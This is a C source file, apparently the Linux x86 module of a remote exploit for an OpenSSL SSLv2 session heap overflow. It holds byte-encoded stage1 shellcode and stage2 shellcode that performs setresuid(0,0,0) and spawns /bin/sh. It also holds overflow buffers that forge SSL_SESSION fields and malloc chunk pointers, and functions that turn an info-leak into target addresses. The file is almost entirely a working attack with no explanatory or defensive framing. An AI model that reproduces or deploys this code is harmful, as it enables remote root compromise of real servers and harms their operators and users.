#include <stdio.h>
#include <stdint.h>

#include "main.h"

/* stage1 shellcode should be shorter than 64 bytes (128 on some systems) */

/* 64 bytes of stage1 shellcode. */
unsigned char shellcode_stage1_linux_x86[] =

	/* for (fd=32; fd > 0; fd--) fork(); */

	"\x31\xc9"             /* xor     %ecx,%ecx              */
	"\x80\xc1\x21"         /* add     $0x21,%cl              */

	"\xeb\x2d" "A"         /* jmp     <get_addr>             */
    "AAAA"          /* this is overwritten with fd by unlink */

/* fork_loop: */
	"\x31\xc0"             /* xor     %eax,%eax              */
	"\x04\x02"             /* add     $0x2,%al               */
	"\xcd\x80"             /* int     $0x80                  */
	"\x85\xc0"             /* test    %eax,%eax              */
	"\xe0\xf6"             /* loopnz  <fork_loop>            */
	"\x75\x24"             /* jne     <exit>                 */

	/* read(fd, buf, 3); */

/* read_tag: */
	"\x5b"                 /* pop     %ebx                   */
	"\x87\xd9"             /* xchg    %ebx,%ecx              */
	"\x04\x03"             /* add     $0x3,%al               */
	"\x50"                 /* push    %eax                   */
	"\x5a"                 /* pop     %edx                   */
	"\xcd\x80"             /* int     $0x80                  */

	"\x66\x81\x39\x69\x7a" /* cmpw    $31337,(%ecx)          */
	"\x75\x14"             /* jne     <exit>                 */

	/* write(fd, buf, 3); */

/* write_tag: */
	"\x50"                 /* push    %eax                   */
	"\x40"                 /* inc     %eax                   */
	"\xcd\x80"             /* int     $0x80                  */

	/* read(fd, buf, 768); */

/* read_shellcode: */
	"\x58"                 /* pop     %eax                   */
	"\xc1\xe2\x08"         /* shl     $0x8,%edx              */
	"\xcd\x80"             /* int     $0x80                  */
	"\xff\xe1"             /* jmp     *%ecx                  */

/* get_addr: */
	"\xe8\xd3\xff\xff\xff" /* call    <fork_loop>            */
	
/* buf: */
	"\x90\x90\x90"
	
	/* exit(); */

/* exit: */
	"\x31\xc0"             /* xor     %eax,%eax              */
	"\x40"                 /* inc     %eax                   */
	"\xcd\x80"             /* int     $0x80                  */
;

unsigned char shellcode_stage2_linux_x86[] =
	/* 14 byte dup shellcode */
	"\x31\xc9"             /* xor    %ecx,%ecx               */
	"\x80\xc1\x03"         /* add    $0x3,%cl                */

/* dup_loop: */
	"\x31\xc0"             /* xor    %eax,%eax               */
	"\xb0\x3f"             /* mov    $0x3f,%al               */
	"\x49"                 /* dec    %ecx                    */
	"\xcd\x80"             /* int    $0x80                   */
	"\x75\xf7"             /* jnz    <dup_loop>              */

	/* 10 byte setresuid(0,0,0); by core */
    "\x31\xc9"             /* xor    %ecx,%ecx               */
    "\xf7\xe1"             /* mul    %ecx,%eax               */
    "\x51"                 /* push   %ecx                    */
    "\x5b"                 /* pop    %ebx                    */
	"\xb0\xa4"             /* mov    $0xa4,%al               */
    "\xcd\x80"             /* int    $0x80                   */

	/* 24 bytes execl("/bin/sh", "/bin/sh", 0); by LSD-pl */
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdql                           */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */

	/* exit(0); */
	"\x31\xdb"             /* xor     %ebx,%ebx              */
	"\xf7\xe3"             /* mul     %ebx,%eax              */
	"\x40"                 /* inc     %eax                   */
	"\xcd\x80"             /* int     $0x80                  */
;

unsigned char overwrite_session_id_length_linux_x86[] =
	"AAAA"								/* int master_key_length; */
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"	/* unsigned char master_key[SSL_MAX_MASTER_KEY_LENGTH];	*/
	"\x70\x00\x00\x00"					/* unsigned int session_id_length; */
;

unsigned char overwrite_next_malloc_chunk_linux_x86[] =
	"AAAA"								/* int master_key_length; */
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"	/* unsigned char master_key[SSL_MAX_MASTER_KEY_LENGTH];	*/
	"AAAA"								/* unsigned int session_id_length; */
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"	/* unsigned char session_id[SSL_MAX_SSL_SESSION_ID_LENGTH]; */
	"AAAA"								/* unsigned int sid_ctx_length; */
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"	/* unsigned char sid_ctx[SSL_MAX_SID_CTX_LENGTH]; */
	"AAAA"								/* int not_resumable; */
	"\x00\x00\x00\x00"					/* struct sess_cert_st *sess_cert; */
	"\x00\x00\x00\x00"					/* X509 *peer; */
	"AAAA"								/* long verify_result; */
	"\x01\x00\x00\x00"					/* int references; */
	"AAAA"								/* int timeout; */
	"AAAA"								/* int time */
	"AAAA"								/* int compress_meth; */
	"\x00\x00\x00\x00"					/* SSL_CIPHER *cipher; */
	"AAAA"								/* unsigned long cipher_id; */
	"\x00\x00\x00\x00"					/* STACK_OF(SSL_CIPHER) *ciphers; */
	"\x00\x00\x00\x00\x00\x00\x00\x00"	/* CRYPTO_EX_DATA ex_data; */
	"AAAAAAAA"							/* struct ssl_session_st *prev,*next; */

	"\x00\x00\x00\x00"					/* Size of previous chunk */
	"\x11\x00\x00\x00"					/* Size of chunk, in bytes */
	"fdfd"								/* Forward and back pointers */
	"bkbk"
	"\x10\x00\x00\x00"					/* Size of previous chunk */
	"\x10\x00\x00\x00"					/* Size of chunk, PREV_INUSE is set */
;


/* offsets in the data we read from the server */
#define SESS_CIPHER_OFS		100
#define SESS_CIPHERS_OFS	108

/* offsets in overwrite_sess_cert[] */
#define CIPHER_OFS			156

/* offset of the shellcode */
#define FUNC_ADDR_OFS		192		/* fdfd */
#define SHELLCODE_ADDR_OFS	196		/* bkbk */

#define SHELLCODE_OFS		(sizeof(overwrite_next_malloc_chunk_linux_x86)-1)

/* Returns the value of the cipher variable in a SSL_SESSION structure
   returned by the OpenSSL info-leak */
uint32_t get_cipher_linux_x86(unsigned char* buf, int len)
{
	uint32_t cipher;

	if (len < SESS_CIPHERS_OFS+4) {
		printf("This server is not vulnerable to the attack.\n");
		exit(1);
	}
	
	/* read the two values from the session data */
	cipher = letohl(&buf[SESS_CIPHER_OFS]);

	return cipher;
}

/* Returns the value of the ciphers variable in a SSL_SESSION structure
   returned by the OpenSSL info-leak */
uint32_t get_ciphers_linux_x86(unsigned char* buf, int len)
{
	uint32_t ciphers;

	if (len < SESS_CIPHERS_OFS+4) {
		printf("This server is not vulnerable to the attack.\n");
		exit(1);
	}
	
	/* read the two values from the session data */
	ciphers = letohl(&buf[SESS_CIPHERS_OFS]);

	return ciphers;
}

/* Builds a stage1 shellcode, using the values of the cipher and ciphers variables
   returned by the info-leak in OpenSSL */
int build_shellcode_linux_x86(unsigned char* buf, int len, int port, uint32_t cipher, uint32_t ciphers, uint32_t func_addr)
{
	uint32_t start_addr;
	
	/* start building the key_arg overflow data */
	memcpy(buf, overwrite_next_malloc_chunk_linux_x86, sizeof(overwrite_next_malloc_chunk_linux_x86)-1);
	memcpy(&buf[SHELLCODE_OFS], shellcode_stage1_linux_x86, sizeof(shellcode_stage1_linux_x86)-1);

	/* put the port in the shellcode, in network byte order */
/*	htobes(port, &buf[FINDSCKPORT_OFS]);*/

	/* overwrite s->session->cipher with its original value */
	htolel(cipher, &buf[CIPHER_OFS]);

	/* calculate the address where our data starts */
	start_addr = ciphers + 16 - SHELLCODE_OFS;

	printf("ciphers: 0x%x   start_addr: 0x%x   SHELLCODE_OFS: %d\n", ciphers, start_addr, SHELLCODE_OFS);

	/* set up the malloc pointers */
	htolel(func_addr - 12, &buf[FUNC_ADDR_OFS]);
	htolel(start_addr + SHELLCODE_OFS, &buf[SHELLCODE_ADDR_OFS]);

	return (sizeof(overwrite_next_malloc_chunk_linux_x86)-1 + sizeof(shellcode_stage1_linux_x86)-1);
}


struct architecture arch_linux_x86 =
	{
		"Linux x86 Malloc Chunk",
		
		overwrite_session_id_length_linux_x86,
		sizeof(overwrite_session_id_length_linux_x86)-1,	/* -1 because we don't need the null byte */

		shellcode_stage2_linux_x86,
		sizeof(shellcode_stage2_linux_x86),

		"\x69\x7a\x00",
		3,

		&get_cipher_linux_x86,
		&get_ciphers_linux_x86,
		&build_shellcode_linux_x86
	};

/* EOF */


